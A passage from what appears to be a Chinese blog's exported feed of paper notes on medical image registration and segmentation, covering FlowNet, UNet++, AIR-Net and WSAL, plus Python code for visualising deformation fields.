W(\theta)$$模型采用Adam作为优化器，学习率为$1e^ {-4}$，batch size为10，$\lambda=0.1$，迭代2000次。 实验 将模型在10个病人的100个MR序列的心脏电影短片上做了训练，并与moving mesh correspondence算法做了对比。采用MICCAI的MRI图像数据集ACDC2017（Automated Cardiac Diagnosis Challenge），使用Dice指标（Dice Metric，DM）评价两张图片的相似性，其定义如下：$$D(M, N)=\frac{2(M \cap N)}{M+N}$$其取值范围是[0, 1]，0表示完全不匹配，1表示完全匹配。 使用完全累积分布函数（the complementary cumulative distribution function ，ccdf）来衡量模型的置信度，其定义如下：$$R(d)=P(D M&gt;d)$$其中$d\in[0,1]$。 实验结果如下表，Dice的格式为：均值$\pm$标准差。 当序列$I_i$被选做浮动图像的时候，$I_{i+1}$被选作固定图像。 上图中蓝色和红色分别是通过FCNet和baseline模型得到的结果。实在没出来是配准的过程……感觉更像是分割，绝了……]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[医学图像配准之形变场可视化（绘制形变场）]]></title>
    <url>%2F2020%2F07%2F17%2Fshow-phi%2F</url>
    <content type="text"><![CDATA[本文讲述医学图像配准中形变场的可视化，包括一种直接通过工具查看的方法和两种手工绘制的方法。 首先来介绍一下形变场，一个大小为[W,H]的二维图像对应的形变场的大小是[W,H,2]，其中第三个维度的大小为2，分别表示在x轴和y轴方向的位移。同理，一个大小为[D,W,H]的三维图像对应的形变场的大小是[D,W,H,3]，其中第三个维度的大小为3，分别表示在x轴、y轴和z轴方向的位移。下图是一个二维脑部图像配准后得到的形变场。 如一开始所说，下面介绍3中方式来将形变场可视化。 1. 使用ITK-Snap可视化形变场这种方式是最便捷也是我认为效果最好的，但是只适用于三维的形变场。首先将形变场保存为”.nii”图像，用ITK-Snap工具打开，首先在下图红框的位置悬停一段时间，出现下图中的图标后点击，选择“Multi-Component Display”下面的“Grid”，就可以看到下图所示的效果。 2. 毛毛大神的方法具体思路请看毛毛大神的文章plt.contour 绘制图像形变场（Deformation Field）。其实具体思路我没有完全看懂，大约是先产生一个规则的网格，然后加上形变场后展示出来。但是如果网格是[W,H]大小的，但是形变场是[W,H,2]大小的，所以只能选择一个维度相加，感觉有点奇怪。代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import matplotlib.pyplot as pltimport SimpleITK as sitkimport numpy as npdef grid2contour(grid, title): ''' grid--image_grid used to show deform field type: numpy ndarray, shape： (h, w, 2), value range：(-1, 1) ''' assert grid.ndim == 3 x = np.arange(-1, 1, 2.0 / grid.shape[1]) y = np.arange(-1, 1, 2.0 / grid.shape[0]) X, Y = np.meshgrid(x, y) Z1 = grid[:, :, 0] + 2 # remove the dashed line Z1 = Z1[::-1] # vertical flip Z2 = grid[:, :, 1] + 2 plt.figure() plt.contour(X, Y, Z1, 15, levels=50, colors='k') #改变levels的值，可以改变形变场的密集程度 plt.contour(X, Y, Z2, 15, levels=50, colors='k') plt.xticks(()), plt.yticks(()) # remove x, y ticks plt.title(title) plt.show()def show_grid(): img = sitk.ReadImage("./2D1.nii") img_arr = sitk.GetArrayFromImage(img) img_shape = img_arr.shape # 起点、终点、步长（可为小数） x = np.arange(-1, 1, 2 / img_shape[1]) y = np.arange(-1, 1, 2 / img_shape[0]) X, Y = np.meshgrid(x, y) regular_grid = np.stack((X, Y), axis=2) grid2contour(regular_grid, "regular_grid") rand_field = np.random.rand(*img_shape[:2], 2) # 参数前加*是以元组形式导入 rand_field_norm = rand_field.copy() rand_field_norm[:, :, 0] = rand_field_norm[:, :, 0] * 2 / img_shape[1] rand_field_norm[:, :, 1] = rand_field_norm[:, :, 1] * 2 / img_shape[0] sampling_grid = regular_grid + rand_field_norm grid2contour(sampling_grid, "sampling_grid") img_arr[..., 0] = img_arr[..., 0] * 2 / img_shape[1] img_arr[..., 1] = img_arr[..., 1] * 2 / img_shape[0] img_grid = regular_grid + img_arr grid2contour(img_grid, "img_grid")if __name__ == "__main__": show_grid() print("end") 在代码的第20行，改变levels的值，可以改变形变场中网格的密集程度。 3. 先生成规则网格，再用空间变换网络进行变形这种方式是配准群里的一位朋友提出的，自己进行实现。思路是先生成规则网格并保存为图片，再用空间变换网络进行变形。代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import numpy as npimport SimpleITK as sitkimport matplotlib.pyplot as pltimport torchimport torch.nn as nnimport torch.nn.functional as F# 空间转换网络class SpatialTransformer(nn.Module): # 1.生成网格grid；2.new_grid=grid+flow，即旧网格加上一个位移；3.将网格规范化到[-1,1]；4.根据新网格对原图进行采样 def __init__(self, size, mode='bilinear'): """ Instiatiate the block :param size: size of input to the spatial transformer block :param mode: method of interpolation for grid_sampler """ super(SpatialTransformer, self).__init__() # Create sampling grid vectors = [torch.arange(0, s) for s in size] grids = torch.meshgrid(vectors) grid = torch.stack(grids) # y, x, z grid = torch.unsqueeze(grid, 0) # add batch grid = grid.type(torch.FloatTensor) self.register_buffer('grid', grid) self.mode = mode def forward(self, src, flow): """ Push the src and flow through the spatial transform block :param src: the original moving image :param flow: the output from the U-Net """ new_locs = self.grid + flow shape = flow.shape[2:] # Need to normalize grid values to [-1, 1] for resampler for i in range(len(shape)): new_locs[:, i, ...] = 2 * (new_locs[:, i, ...] / (shape[i] - 1) - 0.5) if len(shape) == 2: new_locs = new_locs.permute(0, 2, 3, 1) # 维度置换，变为0,2,3,1 new_locs = new_locs[..., [1, 0]] elif len(shape) == 3: new_locs = new_locs.permute(0, 2, 3, 4, 1) new_locs = new_locs[..., [2, 1, 0]] return F.grid_sample(src, new_locs, mode=self.mode)# 生成网格图片def create_grid(size, path): num1, num2 = (size[0] + 10) // 10, (size[1] + 10) // 10 # 改变除数（10），即可改变网格的密度 x, y = np.meshgrid(np.linspace(-2, 2, num1), np.linspace(-2, 2, num2)) plt.figure(figsize=((size[0] + 10) / 100.0, (size[1] + 10) / 100.0)) # 指定图像大小 plt.plot(x, y, color="black") plt.plot(x.transpose(), y.transpose(), color="black") plt.axis('off') # 不显示坐标轴 # 去除白色边框 plt.gca().xaxis.set_major_locator(plt.NullLocator()) plt.gca().yaxis.set_major_locator(plt.NullLocator()) plt.subplots_adjust(top=1, bottom=0, left=0, right=1, hspace=0, wspace=0) plt.margins(0, 0) plt.savefig(path) # 保存图像 # plt.show()if __name__ == "__main__": out_path = r"C:\Users\zuzhiang\Desktop\new_img.jpg" # 图片保存路径 # 读入形变场 phi = sitk.ReadImage("./2D1.nii") # [324,303,2] phi_arr = torch.from_numpy(sitk.GetArrayFromImage(phi)).float() phi_shape = phi_arr.shape # 产生网格图片 create_grid(phi_shape, out_path) img = sitk.GetArrayFromImage(sitk.ReadImage(out_path))[..., 0] img = np.squeeze(img)[np.newaxis, np.newaxis, :phi_shape[0], :phi_shape[1]] # 用STN根据形变场对网格图片进行变形 STN = SpatialTransformer(phi_shape[:2]) phi_arr = phi_arr.permute(2, 0, 1)[np.newaxis, ...] warp = STN(torch.from_numpy(img).float(), phi_arr) # 保存图片 warp_img = sitk.GetImageFromArray(warp[0, 0, ...].numpy().astype(np.uint8)) sitk.WriteImage(warp_img, out_path) print("end") 需要一提的是，由于不能精确的决定网格图片的大小，所以在生成的时候多生成了10个像素，然后在读取的时候再进行裁剪。改变上述代码中第57行的除数（10）可以改变网格线的密集程度。 感觉这种方式更优雅一点，但是效果和第二种是差不多的，第二种和第三种方法的效果如下图所示：]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】FlowNet：有监督的光流估计（optical flow estimation）网络]]></title>
    <url>%2F2020%2F07%2F17%2FFlowNet%2F</url>
    <content type="text"><![CDATA[本文是论文《FlowNet: Learning Optical Flow with Convolutional Networks》的阅读笔记。 一、概述文章提出了一个名为FlowNet的网络，用有监督的方法根据输入的图像对来解决光流估计（optical flow estimation）问题。FlowNet有两种结构，一种是通用结构，另一种包括一个在不同图像位置的关联特征向量的层。又由于现有的数据集的数据量不足够训练CNN，所以又生成了一个合成的Flying Chairs数据集。 光流估计不仅需要每个像素精确的位置，还需要找到两张输入图之间的关联。这就要求不仅要学习到图像的特征表达，还需要学习到怎样将两张图像中不同的位置相匹配。 尽管可以用数据增强来扩充数据量，但是现有的光流数据集还是太小了，并且从视频素材中获取光流的ground truth是十分困难的。因此作者生成了一个合成的Flying Chairs数据集。FlowNet每秒大约可以处理10个图像对，达到了实时处理模型中的顶尖水平。下图是FlowNet的网络示意图，有点类似于UNet。 二、网络结构FlowNet的输入是一个图像对，以及对应的光流ground truth。在FlowNet中信息先在收缩路径进行空间压缩，然后在扩张路径得到改善。文章在传统的CNN网络基础上加入了一个关联层（correlation layer）使网络具有匹配的能力，它用来学习和提取不同尺度的强特征，并找到它们之间的关联。 1. 收缩路径收缩路径的设计有两种方案，一种是将所有输入图像在通道上堆叠（拼接），然后将它们输入到普通的网络中，这种方案被称作FlowNetSimple。另一种方案是将输入图像分别输入到两个独立但结构相同的处理流中，并在后面将两个流处理的结果进行合并。这种方式分别得到图像的特征，再将其合并。采用这种方案的网络被称为FlowNetCorr。 在FlowNetCorr中采用了关联层来促进网络的匹配过程。给定两个多通道的特征图$f_1，f_2$，其宽、高、通道数分别为$w，h，c$。关联层用来比较每个$f_1$和$f_2$中的patch。第一个特征图中以位置$x_1$ 为中心的patch和第二个特征图中以$x_2$ 为中心的patch之间的关联性定义为：$$c\left(\mathbf{x}{1}, \mathbf{x}{2}\right)=\sum_{\mathbf{o} \in[-k, k] \times[-k, k]}\left\langle\mathbf{f}{1}\left(\mathbf{x}{1}+\mathbf{o}\right), \mathbf{f}{2}\left(\mathbf{x}{2}+\mathbf{o}\right)\right\rangle$$每个patch是大小为$K:=2k+1$的正方形，上述公式和卷积操作类似，不同的是它没有参数。由于以上公式的计算量比较大，所以对最大位移做了限制，并且在两张特征图中引入了步长。给定最大位移$d$，只需要对以位置$x_1$为中心，大小为$D:=2d+1$范围的邻居计算关联性$c(x_1,x_2)$。使用步长$s_1$和$s_2$来对$x_1$进行全局量化，并在以$x_1$为中心的邻域内对$x_2$进行量化。 收缩路径具有九个卷积层，并且每个卷积层后面跟着ReLU激活函数，其中6个卷积层的步长为2。没有全连接层，这样网络可以接受任意大小的输入图像。第一个卷积层的卷积核大小为$7\times7$，第2，3个为$5\times5$，后面的卷积核为$3\times3$。收缩路径的具体结构如下图所示。 2. 扩张路径pooling操作在CNN中是必要的，它可以让网络聚合较大区域的信息，但是pooling会导致分辨率降低。所以就需要对池化后的比较粗糙的表示（representation）进行改善。在FlowNet中是通过扩张路径来实现的。 扩张路径主要由多个“上卷积（upconvolutional）”层组成，每个上卷积层包括一个unpooling（作为pooling操作的反操作，用来扩张特征图）和卷积操作。通过这种方式，既保留了来自粗糙特征图的高水平信息，又改善了低层特征图的局部信息。重复该过程四次，但最后的输出还是比原始大小小四倍。又由于更多的分辨率改善并不能提升效果，所以就直接使用双线性上采样来恢复到原始输入大小。扩张路径的结构如下图所示。 作者还使用了变分的方法来代替以上双线性上采样的方法，即先用20次迭代将流场恢复到原始大小，然后在全图像分辨率下再运行5次迭代，并计算图像边界，通过$\alpha=\exp \left(-\lambda b(x, y)^{\kappa}\right)$替换平滑系数来重新检查检测到的边界，其中$b(x,y)$表示在各自的尺度和像素间重采样的薄边界强度。这种方式计算量更大，但是可以获得光滑的亚像素级的精确流场。下面会用一个“+v”的后缀来表示使用这种变分方法得到的结果。下图是采用变分法和FlowNetS的实验结果对比，前者会更好一点。 三、实验1. 数据集使用的已有数据集有Middlebury数据集、KITTI数据集和MPI Sintel数据集（分为Clean和Final两种），并通过仿射变换生成了一个新的合成数据集Flying Chairs。下图是每个数据集的情况。 并且使用了数据增强来增加训练集大小，具体的使用了仿射变换（平移，旋转，缩放，添加高斯噪声，改变亮度、对比度、gamma值和颜色）。下图是数据增强前后的对比图。 2. 训练设置FlowNetC中的关联层中选用参数$k=0，d=20，s_1=1，s_2=2$。使用端点误差（endpoint error，EPE）作为训练的损失函数，它表示预测的流向量和ground truth之间每个像素平均的欧几里得距离。 选用Adam作为优化器，参数为$\beta_1=0.9，\beta_2=0.999$，mini-batch size为8个图像对，学习率为$1e^{-4}$，在前300k轮迭代后没经过100k次迭代学习率衰减为上次的一半。在FlowNetC中，学习率设为$1e^{-6}$，以防止梯度爆炸，并在10k次迭代后让学习率缓慢接近$1e^{-4}$。 在正式使用模型时，需要在目标数据集上进行微调，即以学习率$1e^{-6}$学习几千次。后面将用“-ft”的后缀表示使用了微调的模型。 3. 实验结果下图是各个方法在不同数据集上的实验结果对比图。FlowNetC似乎对大的位移预测有问题。 下图是实验可视化的结果。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】无监督的端到端学习的医学图像配准模型]]></title>
    <url>%2F2020%2F07%2F15%2FUnsupervisedEnd-to-endLearningForDeformableMedicalImageRegistration%2F</url>
    <content type="text"><![CDATA[本文是论文《Unsupervised End-to-end Learning for Deformable Medical Image Registration》的阅读笔记。该模型要比VoxelMorph更早一点，网络结构上两者非常类似，不同的是，本文的模型的配准网络采用的是FlowNet，而VoxelMorph采用的是UNet，两者结构是类似的，都是编码器-解码器结构，都有跳跃连接。此外，该模型在配准网络前面还加入了一个ROI分割网络，以将感兴趣的组织部分和背景分离开来。 一、概述文章提出了一个无监督的端到端的深度医学图像配准模型，并且将ROI（感兴趣区域）分割mask引入到该模型中，以提升效果。文章的贡献主要有三个方面： 将传统的医学图像配准算法移植到了端到端的基于学习的医学图像配准中，同时保留了配准问题无监督的本性； 引入了ROI分割mask来减少背景的噪声并给出所要配准的器官的位置，这导致配准效果有了显著的提升； 配准的速度比传统算法快100倍。 下图是模型的整体示意图，但是ROI分割网络没有画出来，整体看来和VoxelMorph是很类似的。 二、 传统的医学图像配准算法传统的医学图像配准算法主要右损失函数（相似性度量）、多分辨率策略和坐标转换模型组成。损失函数用来衡量配准后两幅图像的相似程度，通常还会采用正则项来惩罚不希望的变形；多分辨率策略是一种已经被广泛采用的用来提升配准速度和优化稳定性的技术，它会生成不同分辨率的图像，并从粗糙到精细对其进行处理。其实类似于UNet结构的解码器部分每一层的输出的特征图，这些特征图是不同分辨率的；坐标转换模型是决定对图像做刚体变换、仿射变换、B样条变换还是更加复杂的变换。在坐标变换时，采用无参的变换模型是有必要的。无参的配准指在找到每个像素点单独的位移。 传统的方法有一个缺点就是对每张图像都要迭代更新，这就限制了配准的速度，同时也忽略了来自相同数据集图像的共同特性。 三、 方法1. 定义： $I_M$：浮动图像 $I_F$：固定图像 $u$：形变场 $\tilde{I}$：变形后的浮动图像，其定义如下 $$\tilde{I}(x)=I_M(x+u(x))$$ 其中$x$表示像素位置。 形变场预测模型受到了FlowNet的启发，FlowNet用来解决光流估计问题，它的输入是两张图片，输出是一个用来使两张图像对齐的密集光流（形变场）。FlowNet的结构有点类似于UNet，由收缩路径和扩张路径组成，并且之间有跳跃连接。本文所提出的图像配准网络的详细结构如上图所示。 2. 相关工作与本文密切相关的文章有FlowNet，STN（空间变换网络）、HNN（holistically-nested network）。 FlowNet本来是一个有监督的模型，为了解决该问题，可以将传统配准算法得到的配准结果当作ground truth。FlowNet的结构如下所示，图中忽略了跳跃连接，解码器每层上方的是不同分辨率的特征图，只有最后一层的特征图用作输出的形变场。 FlowNet的使用还是有些不协调，这是因为传统的算法是无监督，而神经网络的训练通常是有监督的。为了解决该问题，文章将STN插入到该模型中，用作无监督的学习。选择STN的原因有两个，一是它可以对图像进行变形，并且生成测光损失（photometric loss），二是它是通过双线性插值实现的，是完全可微的，可以进行反向传播。STN的工作原理是根据前面的网络（FlowNet）预测出来的形变场，从一个规整网格得到一个采样网格，然后用该采样网格对图像进行双线性插值的采样，得到变形后的图像。 医学图像配准需要精确的分割mask以将配准的重点聚焦在特定ROI上，所以可以在图像配准网络的前面加上ROI分割网络，将要配准的组织分割出来，然后对其做基于分割mask的配准。这里选用的是HNN（holistically-nested net），ROI分割网络可以在给定足够的带有标签的训练数据的前提下，生成高质量的分割mask。HNN包括5个具有不同接收域大小的卷积阶段，每个阶段有一个side output，一个加权的融合层将所有的side outputs作为输入并得到一个融合了各个尺度信息的概率图。下图是ROI分割网络的示意图。 3. 损失函数光度差损失（photometric difference loss）：$$\mathcal{L}{\text {photometric }}^{s}=\sum{\mathbf{x} \in \Omega}\left|\tilde{I}^{s}(\mathbf{x})-I_{F}^{s}(\mathbf{x})\right|$$其中$\tilde{I}^{s}(\mathbf{x})=I_{M}^{s}\left(\mathbf{x}+\mathbf{u}^{\mathbf{s}}(\mathbf{x})\right)$是先将浮动图像resize到尺度$s$，然后根据形变场$u^s(x)$用STN对齐进行采样变形；$I_{F}^{s}(\mathbf{x})$是将固定图像resize到尺度$s$的结果；$\Omega$是二维图像空间。 形变场平滑损失： 该损失可以让预测出的形变场保持局部平滑的特性，文章一共提出了两种正则项，一个是$\mathcal{L}{smoothN}$，它是关于形变场梯度$\partial{u^s(x)}$的$L1$正则项，其表达式如下：$$\mathcal{L}{\text {smoothN}}^{s}=\sum_{\mathbf{x} \in \Omega}\left|\partial_{x} \mathbf{u}^{\mathbf{s}}(\mathbf{x})\right|+\left|\partial_{y} \mathbf{u}^{\mathbf{s}}(\mathbf{x})\right|$$其中$\partial{x}，\partial{y}$是沿着两个方向的偏导。 $\mathcal{L}{smoothE}$是边缘感知项（edge-aware term）的$L1$加权惩罚项，其表达式如下：$$\mathcal{L}{\text {smooth} E}^{s}=\sum_{\mathbf{x} \in \Omega}\left|\partial_{x} \mathbf{u}^{\mathbf{s}}(\mathbf{x})\right| e^{-\left|\partial_{x} I_{F}^{s}(\mathbf{x})\right|}+\left|\partial_{y} \mathbf{u}^{\mathbf{s}}(\mathbf{x})\right| e^{-| \partial_{y} I_{F}^{s}(\mathbf{x})||}$$ROI分割网络HNN的总损失如下：$$\mathcal{L}{H N N}=\mathcal{L}{\text {side }}+\mathcal{L}{\text {fuse }}$$其中，$\mathcal{L}{side}$是每个side output的线性组合，$\mathcal{L}_{fuse}$表示融合的概率图的损失。 作者发现当单独使用光度差损失的时候，在某些特殊情况下会导致低质量的形变场，所以又加入了ROI边界重叠损失：$$\mathcal{L}{\text {overlap}}^{s}=\sum{\mathbf{x} \in \Omega}\left|\tilde{D}^{s}(\mathbf{x})-D_{F}^{s}(\mathbf{x})\right|$$其中$\tilde{D}^s(x)=D^s_M(x+u^s(x))$表示浮动图像resize到尺度$s$并通过STN变形后的ROI分割mask；$D^s_F(x)$是固定图像resize到尺度$s$后的ROI分割mask。 训练的总损失是以上失所有损失的加权和：$$\mathcal{L}=\eta \mathcal{L}{H N N}+\sum{s=1}^{7} \alpha_{s} \mathcal{L}{\text {photometric}}^{s}+\beta{s} \mathcal{L}{\text {smooth}}^{s}+\gamma{s} \mathcal{L}_{\text {overlap}}^{s}$$ 四、实验作者在有ground truth和分割mask标注的两个数据集上做了实验，一个是肝脏CT图像，另一个是脑部MRI。作为对比的是传统配准方法，包括ANTs（advanced normalization tools）、Elastix和ITK（insight segmentation and registration toolkit）。同时还采用和FlowNet训练类似的有监督训练方式来作为baseline。 具体设置：采用$\beta_1=0.9，\beta_2=0.999$的Adam优化器，权重衰减为0.0005，batch size是32，HNN使用了预训练的5阶段的VGG来进行微调，FlowNet使用在Flying Chair数据集上训练的FlowNetSimple模型进行微调。在无监督训练时，学习率为$10^{-5}$，在开始10个epoch后，将学习率设为原来的一半，并在后面的7个epoch中保持不变。总损失函数中的$\eta，\alpha，\beta，\gamma$分别设为1，1，0.05和1。在有监督训练时，学习率为$1^{-4}$，经过4个epoch后，学习率衰减为$10^{-7}$，一共有10个epoch。 度量指标选择的是杰卡德系数（Jaccard coefficient）和Distance Between Corresponding Landmarks。前一个是用来衡量分割mask和ground truth之间的重叠度，后一个是用来衡量配准精细结构的能力。 以下两图分别是肝脏和脑部数据配准的结果对比表，可以发现文章提出的有监督和无监督的方法会在两个评价指标上取得最优值，并且运行时间比传统方法要快很多。 下图是脑部图像的配准结果，图片(a)-(l)分别表示：(a)浮动图像，(b)浮动图像的ground truth分割mask，(c)固定图像，(d)固定图像的ground truth分割mask，(e)、(g)、(i)、(k)分别表示浮动图像经过最优的传统配准方法（itk16）、最优的有监督baseline、最优有监督baseline w/ mask方法和最优的无监督方法变形得到的结果。(f)、(h)、(j)、(l)中的白色部分是对应图像的ground truth分割mask，红色部分是对应图像的根据预测形变场变形后的ground truth分割mask。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】UNet++：一种用于医学图像分割的嵌套U-Net结构]]></title>
    <url>%2F2020%2F07%2F13%2FUNet-pp%2F</url>
    <content type="text"><![CDATA[本文是《UNet++: A Nested U-Net Architecture for Medical Image Segmentation》论文的阅读笔记。强烈建议大家去看下作者对这篇论文的思维过程：研习UNet。 文章提出了一个UNet++的网络，它是一个使用了深度监督（deep supervised）的编码器-解码器结构，在解码器和编码器之间有一系列的密集跳跃连接（dense skip connections）。 一、跳跃连接的重要性有很多效果不错的网络结构都采用了跳跃连接的方式，如UNet网络和FCN（全卷积网络）。不同的是，FCN的跳跃连接是通过元素级的相加来实现的，而UNet的跳跃连接是通过通道的拼接来实现的。此外，ResNet中的shortcut和DenseNet中的密集连接（dense connection）也有异曲同工之妙。跳跃连接可以让解码器中深层的、语义的、粗糙的特征图和编码器中浅层的、低级的、精细的特征图相结合。 由于医学图像是对手术有指导意义，而万一有所偏差则会产生较为严重的后果，所以医学图像的处理要求比自然图像有更高的精度。 二、网络结构 UNet++网络的结构如上图(a)所示，其中黑色的部分是原来的UNet，绿色和蓝色的部分是在跳跃路径上的密集卷积块（dense convolution blocks），红色的连线表示深度监督。 UNet++与原始的UNet主要有三点不同之处： 在跳跃路径上有卷积层（图中绿色部分），减小了编码器和解码器特征图之间的语义鸿沟（semantic gap） 在跳跃路径上有密集跳跃连接（图中蓝色部分），提升了梯度流 有深度监督（图中红色部分），可以让模型实现剪枝和提升 1. 跳跃连接让$x^{i,j}$表示节点$X^{i,j}$的输出，其中$i$表示层数，$j$表示当前层的第$j$个卷积层。$x^{i,j}$就可以通过一下公式来计算：$$x^{i, j}=\left{\begin{array}{l}\mathcal{H}\left(x^{i-1, j}\right), \quad j=0 \\mathcal{H}\left(\left[\left[x^{i, k}\right]_{k=0}^{j-1}, \mathcal{U}\left(x^{i+1, j-1}\right)\right]\right), \quad j&gt;0\end{array}\right.$$其中，函数$\mathcal H(\cdot)$表示卷积操作和激活函数，$\mathcal U(\cdot)$表示上采样层，$[]$表示拼接层（concatenation layer）。UNet++中的密集连接如上图(b)所示。 2. 深度监督模型一共有四层，也就是有四个分支（语义级），深度监督有两种模式： 精确模式，在该模式下所有分割分支的结果取平均值得到最终的结果； 快速模式，在该模式下只选择一个分割分支，其他的被剪枝。 当某个分支的权重为0时，就相当于是对其进行剪枝了，示意图如上图(c)所示。 用二值交叉熵和DICE系数的结合来作为四个语义级的损失函数，如下所示：$$\mathcal{L}(Y, \hat{Y})=-\frac{1}{N} \sum_{b=1}^{N}\left(\frac{1}{2} \cdot Y_{b} \cdot \log \hat{Y}{b}+\frac{2 \cdot Y{b} \cdot \hat{Y}{b}}{Y{b}+\hat{Y}_{b}}\right)$$其中，$\hat{Y_b}$和$Y_b$分别表示第$b$张图片的预测概率和ground truth，$N$表示batch size。 三、实验 实验过程使用了四个数据集，如表1所示，分别为：。 用于作比对的网络模型选用的是原始的UNet和自定义的wide UNet模型。评价指标选用的是DICE系数和IoU（交并比）。采用学习率为3e-4的Adam作为训练的优化器，UNet和wide UNet的详细结构如表2所示。第$i$层的卷积层使用的是$k$个卷积核为$3\times3$或$3\times3\times3$的卷积操作，其中$k=32\times2^i$。在深度监督时，每个目标节点${x^{0,j}|j\in{1,2,3,4}}$后跟着的是$1\times1$的卷积操作和sigmoid激活函数。 实验结果如上图和表3所示，在IoU指标上，没有深度监督（DS）的UNet++比baseline平均提升了2.8到3.3个点。有深度监督的UNet++平均提升了0.6个点。 上图显示的是不同的剪枝下模型的效果和时间对比图，其中UNet++$L^i$表示的是在第$i$个level进行剪枝的UNet++模型。可以发现UNet++$L^3$在损失一点精度的情况下实现了时间的大幅缩减。 四、其他根据作者《研习UNet》的文章，我下面来捋一下作者的idea产生的过程。 首先作者意识到了跳跃连接会提升模型的效果，但是模型的深度为多少时才最合适呢？当然我们可以创建不同深度的模型然后分别进行实验，找出最优的那个，但是这样太遭罪了。下图是不同深度下的网络模型，所以作者想可不可以将不同深度的模型拼成一个呢？于是就得到了UNet++网络的雏形。 拼凑的结果如下图所示，但是该模型有个问题，就是红色三角形的部分在反向传播时不能更新，因为$X^{0,3},X^{1,2},X^{2,1}$和右边的操作没有路径连接。 这时有两种解决办法，一种是上面提到的深度监督，另一种更直接一点，将$X^{0,3},X^{1,2},X^{2,1}$和右边的操作连接起来就得了。 但是这样又有一个问题，UNet中使用的是长连接，而上图使用的是短连接，而作者认为长连接是有必要的。所以就将其改成了密集连接的形式，如本文最开始的那张图所示。 而深度监督的加入又让模型具有了剪枝的能力，如下图所示，当某个分支的权重为0时，就相当于做了剪枝操作。 不得不说，妙啊！]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】AIR-Net：基于GAN的配准模型]]></title>
    <url>%2F2020%2F06%2F16%2FAIR-Net%2F</url>
    <content type="text"><![CDATA[本文是论文《Adversarial Image Registration with Application for MR and TRUS Image Fusion》的阅读笔记。 文章提出了一个基于GAN的对MRI和经直肠超声（TRUS）图像进行多模态配准的有监督网络模型AIR-Net，其中MRI被当作固定图像，而经直肠超声图像被当作浮动图像。 模型由生成器 $G$ 和判别器 $D$ 两部分组成，其中生成器直接估计一个从浮动图像到固定图像的转换参数 $T_{est}$；然后通过一个图像采样器分别使用估计的转换参数 $T_{est}$ 和真实（ground-truth）的转换参数 $T_{gt}$ 对浮动图像进行配准处理；并通过判别器来判断图像对是通过 $T_{est}$ 还是 $T_{gt}$ 来进行对齐的。 文章将三维图像看作是多通道的二维图像， 生成器的详细结构如下： 一个空洞卷积层（128通道， dilation rate为2）用来扩大感受野，两个卷积层（128通道，步长为2）用来降低分辨率，一个包含具有残差连接的三个卷积层的残差模块（128通道），一个卷积层（卷积核大小为$1\times1$，通道数为8）用来降低参数数量，两个全连接层用来得到最终的输出，第一个全连接层的输出为256维的，第二个全连接层的输出的维度和转换参数的个数相同（如果是三维刚性配准则有6个参数，如果是三维仿射配准则有12个参数）。以上卷积层如果没有特殊声明，卷积核大小都为$3\times3$，并且后面紧跟一个ReLU激活函数。 判别器的详细结构和生成器几乎相同，唯一不同的地方在于最后一个全连接层的输出维度为1，并且后面跟着一个Sigmoid激活函数。 判别器的损失为：$$ \mathcal{L}(D)=-\mathbb{E}{T \sim p{g t}(T)}\left[D\left(I_{f}, I_{m}\right)\right]+\mathbb{E}{T \sim p{z}(T)}\left[D\left(I_{f}, T\left(I_{m}\right)\right]\right.$$其中 $ I_f $ 和 $ I_m$ 分别是固定图像和浮动图像，$\mathbb{E}{T \sim p{g t}(T)}\left[D\left(I_{f}, I_{m}\right)\right]$ 表示已经对齐的MR-TRUS的图像对的判别器损失的期望，而 $\mathbb{E}{T \sim p{z}(T)}[D(I_{f}, T(I_{m})]$ 表示随机对齐的图像对的判别器损失的期望。 生成器的损失为： $$\mathcal{L}(G)=\mathbb{E}{T \sim p{z}(T)}\left[1-D\left(I_{f}, T_{e s t}\left(T\left(I_{m}\right)\right)\right)+\alpha\left|T_{e s t}-T^{-1}\right|^{2}\right]$$其中 $||T_{eset}-T^{-1}||^2$ 是估计的转换和随机生成的转换之间的欧几里得距离。 在训练时采用了和WGAN（Wasserstein GAN）类似的方法，为了保证训练的稳定性，在每次更新判别器网络的参数即后，需要将其参数clip到某个范围内，clipping 参数值设置为0.1。并且没训练一次生成器网络，判别器网络会更新两次。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】WSAL：基于域适应和生成对抗网络的图像分割模型]]></title>
    <url>%2F2020%2F06%2F06%2FWSAL%2F</url>
    <content type="text"><![CDATA[本文是论文《Weakly Supervised Adversarial Domain Adaptation for Semantic Segmentation in Urban Scenes》的阅读笔记。 在以往的语义分割由于像素级人工标注信息较难获得，并且可能并不准确，所以有些模型采用在生成的数据集上进行训练，然后将训练得到的模型应用在真实数据集上的方法来解决上述问题。但是这种方式的效果并不好。本文据此提出了弱监督的对抗域适应模型。该模型包括三部分，一是物体检测和语义分割模型（DS），用来检测物体并预测分割图；二是像素级的域分类器（PDC），它用来辨别图像特征来自哪个域；三是物体级的域分类器（ODC），它用来辨别物体来自哪个域并对物体类别进行预测。这三部分中，DS可以被看作生成器，PDC和ODC可以看作判别器。 语义分割可以看作是图像分割、物体定位和多物体识别的集合。本文针对的是全城市场景标记。 弱标签指的是图像级或物体级的标签。虽然生成数据集的出现解决了人工标注标签不足的问题，但是在生成图像和真实图像之间存在巨大的domain gap。本文要解决的就是跨模态的语义分割问题。 源域图像需要提供像素级和物体级的标签，而目标域图像只需要提供物体级的标签，目标是预测目标域图像每个像素的标签。 在物体检测和语义分割模型（DS）中，前者可以学习到物体级的特征，并定位物体的 bounding box，后者可以学习到局部特征，并实现像素级的分类。像素级的域分类器（PDC）的输入是分割网络的特征图，输出是源域和目标域图像的每个像素所属的域。物体级的域分类器（ODC）的输入是检测网络的物体特征，输出是物体的分类和域分类。 本文是第一篇用弱监督的方法做跨模态全城市场景标注的。 记号$\mathcal{S}$：源域，即生成数据域 $I_{\mathcal{S}}$：源域图像 